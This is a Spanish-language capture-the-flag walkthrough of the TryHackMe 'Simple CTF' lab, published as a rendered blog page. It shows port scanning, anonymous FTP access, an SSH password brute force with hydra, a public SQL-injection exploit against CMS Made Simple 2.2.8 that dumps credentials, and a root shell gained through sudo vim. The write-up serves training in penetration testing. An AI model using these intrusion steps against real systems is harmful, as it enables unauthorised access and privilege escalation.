@@ -1,0 +1,374 @@
+I"�t<h1 id="tipo-de-maquina"><a href="#header-1"></a>Tipo de Maquina</h1>
+
+<p>Esta es una maquina para principiantes, de nivel muy facil, hecha para aprender reverse shell con <strong>PHP</strong> y aprender la escalada de privilegios mediante los <strong>SUID</strong></p>
+
+<ol>
+  <li>Reconocimiento</li>
+  <li>Explotacion</li>
+  <li>Escalado de privilegios</li>
+</ol>
+
+<h1 id="arrancar-la-maquina"><a href="#header-2"></a>Arrancar la Maquina</h1>
+
+<p>Lo primero que haremos sera arrancar la maquina para ello entraremos a <strong>TryHackme</strong> y le daremos a <code class="language-plaintext highlighter-rouge">Start Machine</code></p>
+
+<p><a href="https://tryhackme.com/room/easyctf">Easy-CTF-TryHackMe</a></p>
+
+<h1 id="reconocimiento"><a href="#header-3"></a>Reconocimiento</h1>
+
+<p>Cuando la maquina se haya iniciado iremos a nuestro directorio de trabajo</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /home/parrot-hacking/Desktop/TryHackMe/
+</code></pre></div></div>
+<p>Crearemos un directorio con el nombre de la maquina</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> /home/parrot-hacking/Desktop/TryHackMe/SimpleCTF
+</code></pre></div></div>
+<p>Ahora con la utilidad <code class="language-plaintext highlighter-rouge">mkt</code> diseñada por <strong>S4vitar</strong>, crearemos nuestros directorios de trabajo <em>nmap</em>, <em>content</em>, <em>exploits</em> y <em>scripts</em></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@home/parrot-hacking/Desktop/TryHackMe/SimpleCTF:~<span class="nv">$ </span>mkt
+</code></pre></div></div>
+
+<h2 id="nmap"><a href="#header-3"></a>Nmap</h2>
+
+<p>Nos meteremos en el directorio nmap y haremos un escaneado a los puertos abiertos de la maquina</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@SimpleCTF:~<span class="nv">$ </span>nmap <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">--open</span> <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-p-</span> simplectf.thm <span class="nt">-oG</span> allPorts
+
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-26 14:48 CEST
+Initiating SYN Stealth Scan at 14:48
+Scanning 10.10.249.50 <span class="o">[</span>65535 ports]
+Discovered open port 21/tcp on 10.10.249.50
+Discovered open port 80/tcp on 10.10.249.50
+Discovered open port 2222/tcp on 10.10.249.50
+Completed SYN Stealth Scan at 14:49, 26.39s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.249.50
+Host is up, received user-set <span class="o">(</span>0.054s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-09-26 14:48:37 CEST <span class="k">for </span>26s
+Not shown: 65532 filtered ports
+Reason: 65532 no-responses
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT     STATE SERVICE      REASON
+21/tcp   open  ftp          syn-ack ttl 63
+80/tcp   open  http         syn-ack ttl 63
+2222/tcp open  EtherNetIP-1 syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>26.51 seconds
+           Raw packets sent: 131086 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 22 <span class="o">(</span>968B<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Ahora con la utilidad <code class="language-plaintext highlighter-rouge">extractPorts</code> vamos a extraer los puertos y copiarnoslos en la clipboard</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@RootMe:~<span class="nv">$ </span>extractPorts allPorts
+
+	<span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+ 
+     		<span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.249.50
+     		<span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 21,80,2222
+ 
+	<span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>Ahora que ya tenemos los puertos copiados en la clipboard, lo que haremos sera poner el siguiente comando para ver que servicio es cada puerto</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@SimpleCTF:~<span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p21</span>,80,2222 easyctf.thm <span class="nt">-oN</span> targeted
+
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-26 14:52 CEST
+Nmap scan report <span class="k">for </span>easyctf.thm <span class="o">(</span>10.10.249.50<span class="o">)</span>
+Host is up <span class="o">(</span>0.046s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+|_Can<span class="s1">'t get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.9.3.94
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 2 disallowed entries 
+|_/ /openemr-5_0_1_3 
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
+|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
+|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 38.19 seconds
+</span></code></pre></div></div>
+
+<h2 id="ftp"><a href="#header-3"></a>FTP</h2>
+
+<p>Vemos que son que el puerto <strong>21</strong> es <strong>FTP</strong>, el puerto <strong>80</strong> es de un servicio <strong>http</strong> y el <strong>2222</strong> es <strong>ssh</strong>
+Bueno lo primero que vamos a hacer es ver si el <strong>FTP</strong> tiene acceso como <strong>anonymous</strong></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@RootMe:~<span class="nv">$ </span>ftp easyctf.thm
+
+Connected to easyctf.thm.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>easyctf.thm:parrot-hacking<span class="o">)</span>: anonymous
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt;
+</code></pre></div></div>
+
+<p>Vemos que si que esta habilitado, asique vamos a ver que hay dentro</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 <span class="nb">.</span>
+drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..
+drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
+226 Directory send OK.
+</code></pre></div></div>
+
+<p>Vemos que hay un directorio llamado <code class="language-plaintext highlighter-rouge">pub</code> asique vamos a entrar</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">cd </span>pub
+250 Directory successfully changed.
+</code></pre></div></div>
+
+<p>Vamos a ver que hay dentro y encontramos un archivo <em>.txt</em>, asique lo traemos para nuestra maquina de atacante</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 <span class="nb">.</span>
+drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..
+<span class="nt">-rw-r--r--</span>    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
+226 Directory send OK.
+ftp&gt; mget <span class="k">*</span>
+<span class="nb">local</span>: ForMitch.txt remote: ForMitch.txt
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Opening BINARY mode data connection <span class="k">for </span>ForMitch.txt <span class="o">(</span>166 bytes<span class="o">)</span><span class="nb">.</span>
+226 Transfer complete.
+166 bytes received <span class="k">in </span>0.01 secs <span class="o">(</span>22.7650 kB/s<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Leemos el archivo <strong>ForMitch.txt</strong> y vemos que nos dice que tiene la misma contraseña en el usuario del sistema y que la ha crackeado en segundos</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@SimpleCTF:~<span class="nv">$ </span><span class="nb">cat </span>ForMitch.txt
+
+Dammit man... you<span class="s1">'te the worst dev i'</span>ve seen. You <span class="nb">set </span>the same pass <span class="k">for </span>the system user, and the password is so weak... i cracked it <span class="k">in </span>seconds. Gosh... what a mess!
+</code></pre></div></div>
+
+<h2 id="web"><a href="#header-4"></a>Web</h2>
+
+<p>Vamos a visitar la web y vemos que es una pagina default de Apache
+<a href="http://easyctf.thm">Web-SimpleCTF</a></p>
+
+<p><img src="https://alvar-yoel.github.io/images/SimpleCTF/Apache.PNG" alt="" /></p>
+
+<h3 id="fuzzing"><a href="#header-4"></a>Fuzzing</h3>
+<p>Ahora tenemos esa pagina web vamos a enumerar sitios web para ello utilizaremos <strong>wfuzz</strong></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@SimpleCTF:~<span class="nv">$ </span>wfuzz <span class="nt">-c</span> <span class="nt">-L</span> <span class="nt">-t</span> 100 <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hh</span><span class="o">=</span>616 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://easyctf.thm//FUZZ
+
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://easyctf.thm//FUZZ
+Total requests: 220560
+
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                                                                                   
+<span class="o">=====================================================================</span>
+
+000004567:   200        126 L    1182 W     19833 Ch    <span class="s2">"simple"</span>                                                                                  
+000095524:   403        11 L     32 W       299 Ch      <span class="s2">"server-status"</span>                                                                           
+
+Total <span class="nb">time</span>: 0
+Processed Requests: 220560
+Filtered Requests: 220558
+Requests/sec.: 0
+</code></pre></div></div>
+
+<p>Ahora iremos a <em>/simple/</em> alli veremos que estamos ante un Simple CMS
+<a href="http://easyctf.thm/simple/">SimpleCMS-TryHackMe</a></p>
+
+<p><img src="https://alvar-yoel.github.io/images/simplectf/CMS.PNG" alt="" /></p>
+
+<h1 id="explotacion"><a href="#header-4"></a>Explotacion</h1>
+
+<p>Hay varias formas de convertirnos en usuario por fuerza bruta o por un CVE</p>
+
+<h2 id="fuerza-bruta-al-ssh1º-forma-de-conseguir-el-usuario"><a href="#header-4"></a>Fuerza Bruta al SSH(1º Forma de conseguir el usuario)</h2>
+<p>Lo que vamos a hacer es con <strong>hydra</strong> atacar por <em>fuerza bruta</em> al <em>ssh</em> y vemos que la contraseña es <code class="language-plaintext highlighter-rouge">secret</code></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@SimpleCTF:~<span class="nv">$ </span>hydra <span class="nt">-s</span> 2222 <span class="nt">-l</span> mitch <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt easyctf.thm <span class="nt">-t</span> 4 ssh
+
+Hydra v9.2 <span class="o">(</span>c<span class="o">)</span> 2021 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>
+
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2021-09-26 15:13:17
+<span class="o">[</span>DATA] max 4 tasks per 1 server, overall 4 tasks, 14344401 login tries <span class="o">(</span>l:1/p:14344401<span class="o">)</span>, ~3586101 tries per task
+<span class="o">[</span>DATA] attacking ssh://easyctf.thm:2222/
+<span class="o">[</span>2222][ssh] host: easyctf.thm   login: mitch   password: secret
+<span class="o">[</span>STATUS] 14344401.00 tries/min, 14344401 tries <span class="k">in </span>00:01h, 1 to <span class="k">do in </span>00:01h, 3 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-09-26 15:14:45 
+</code></pre></div></div>
+
+<h2 id="por-cve-en-la-pagina-web2º-forma-de-conseguir-el-usuario"><a href="#header-4"></a>Por CVE en la pagina Web(2º Forma de conseguir el usuario)</h2>
+
+<p>Lo primero que haremos sera ver ante que nos estamos enfrentando para ello utilizaremos <code class="language-plaintext highlighter-rouge">whatweb</code> y vemos que es la version <code class="language-plaintext highlighter-rouge">CMS-Made-Simple[2.2.8]</code></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@SimpleCTF:~<span class="nv">$ </span>whatweb http://easyctf.thm/simple/
+
+http://easyctf.thm/simple/ <span class="o">[</span>200 OK] Apache[2.4.18], CMS-Made-Simple[2.2.8], Cookies[CMSSESSIDd6a5f2400115], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.221.233], JQuery[1.11.1], MetaGenerator[CMS Made Simple - Copyright <span class="o">(</span>C<span class="o">)</span> 2004-2019. All rights reserved.], Script[text/javascript], Title[Home - Pentest it]
+</code></pre></div></div>
+
+<p>Ahora vamos a buscar un <strong>exploit</strong> y vemos que hay uno de <strong>SQLi</strong>, lo que hace es probar a partir de unas <em>letras</em>, <em>numeros</em> y <em>caracteres</em> y si sale cual es la pagina te lo dice</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@SimpleCTF:~<span class="nv">$ </span>searchsploit CMS Made Simple 2.2.8
+<span class="nt">-------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                                           |  Path
+<span class="nt">-------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+CMS Made Simple &lt; 2.2.10 - SQL Injection                                                                                 | php/webapps/46635.py
+<span class="nt">-------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div>
+
+<p>Ahora lo traeremos a nuestra maquina para ello pondremos</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@SimpleCTF:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/46635.py
+
+  Exploit: CMS Made Simple &lt; 2.2.10 - SQL Injection
+      URL: https://www.exploit-db.com/exploits/46635
+     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+
+Copied to: /home/parrot-hacking/Desktop/TryHackMe/Simple CTF/content/46635.py
+</code></pre></div></div>
+
+<p>Ahora miraremos como funciona el script de <code class="language-plaintext highlighter-rouge">python</code></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@SimpleCTF:~<span class="nv">$ </span>python 46635.py
+<span class="o">[</span>+] Specify an url target
+<span class="o">[</span>+] Example usage <span class="o">(</span>no cracking password<span class="o">)</span>: exploit.py <span class="nt">-u</span> http://target-uri
+<span class="o">[</span>+] Example usage <span class="o">(</span>with cracking password<span class="o">)</span>: exploit.py <span class="nt">-u</span> http://target-uri <span class="nt">--crack</span> <span class="nt">-w</span> /path-wordlist
+<span class="o">[</span>+] Setup the variable TIME with an appropriate <span class="nb">time</span>, because this sql injection is a <span class="nb">time </span>based.
+</code></pre></div></div>
+
+<p>Le pondremos en uso y esperaremos a que nos de el <code class="language-plaintext highlighter-rouge">usuario</code> y la <code class="language-plaintext highlighter-rouge">contraseña</code></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@SimpleCTF:~<span class="nv">$ </span>python 46635.py <span class="nt">-u</span> http://easyctf.thm/simple/
+
+<span class="o">[</span>+] Salt <span class="k">for </span>password found: 1dac0d92e9fa6bb2
+<span class="o">[</span>+] Username found: mitch
+<span class="o">[</span>+] Email found: admin@admin.com
+<span class="o">[</span>+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+</code></pre></div></div>
+
+<h1 id="acceso-como-usuario-sin-privilegios"><a href="#header-4"></a>Acceso como usuario sin privilegios</h1>
+
+<p>Ahora accederemos por ssh al servidor con el usuario <code class="language-plaintext highlighter-rouge">mitch</code> y la contraseña <code class="language-plaintext highlighter-rouge">secret</code></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@SimpleCTF:~<span class="nv">$ </span>ssh mitch@easyctf.thm <span class="nt">-p</span> 2222
+mitch@easyctf.thm<span class="s1">'s password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
+$ 
+</span></code></pre></div></div>
+
+<p>Ahora nos pondremos en una <em>bash</em></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>bash
+mitch@Machine:~<span class="err">$</span>
+</code></pre></div></div>
+
+<h1 id="escalado-de-privilegios"><a href="#header-4"></a>Escalado de Privilegios</h1>
+<p>Bueno ya tenemos shell como <em>mitch</em> ahora vamos a ver si hay algun privilegio <strong>SUID</strong></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mitch@Machine:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
+/bin/su
+/bin/ping
+/bin/mount
+/bin/umount
+/bin/ping6
+/bin/fusermount
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/snapd/snap-confine
+/usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/sbin/pppd
+</code></pre></div></div>
+
+<p>Vemos que no hay ninguno vamos intentar hacernos <em>sudo</em> o si tenemos algun privilegio y vemos que podemos ejecutar <code class="language-plaintext highlighter-rouge">vim</code> como <strong>sudo</strong></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mitch@Machine:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+User mitch may run the following commands on Machine:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/vim
+</code></pre></div></div>
+
+<p>Ahora iremos a <strong>GFTOBins</strong> para ver si podemos convertirnos en <strong>sudo</strong> y vemos que si
+<a href="https://gtfobins.github.io/vim/#sudo">GFTOBins-Vim</a>
+<img src="https://alvar-yoel.github.io/images//python.PNG" alt="" /></p>
+
+<p>Bueno pues vamos a probarlo</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mitch@Machine:~<span class="nv">$ </span>mitch@Machine:~<span class="nv">$ </span><span class="nb">sudo </span>vim
+</code></pre></div></div>
+
+<p>Ahora cuando se nos abra daremos al <strong>ESC</strong> y pondremos <code class="language-plaintext highlighter-rouge">:!/bin/bash</code></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                    VIM - Vi IMproved                                                                     
+~                                                                                                                                                          
+~                                                                    version 7.4.1689                                                                      
+~                                                                by Bram Moolenaar et al.                                                                  
+~                                                 Modified by pkg-vim-maintainers@lists.alioth.debian.org                                                  
+~                                                       Vim is open <span class="nb">source </span>and freely distributable                                                        
+~                                                                                                                                                          
+~                                                              Help poor children <span class="k">in </span>Uganda!                                                               
+~                                                     <span class="nb">type</span>  :help iccf&lt;Enter&gt;       <span class="k">for </span>information                                                        
+~                                                                                                                                                          
+~                                                     <span class="nb">type</span>  :q&lt;Enter&gt;               to <span class="nb">exit</span>                                                                
+~                                                     <span class="nb">type</span>  :help&lt;Enter&gt;  or  &lt;F1&gt;  <span class="k">for </span>on-line <span class="nb">help</span>                                                       
+~                                                     <span class="nb">type</span>  :help version7&lt;Enter&gt;   <span class="k">for </span>version info                                                       
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+~                                                                                                                                                          
+:!/bin/bash
+</code></pre></div></div>
+
+<p>Ahora ya somos root y ya podremos coger la flag de root</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Machine:~# <span class="nb">whoami
+</span>root
+</code></pre></div></div>
+:ET
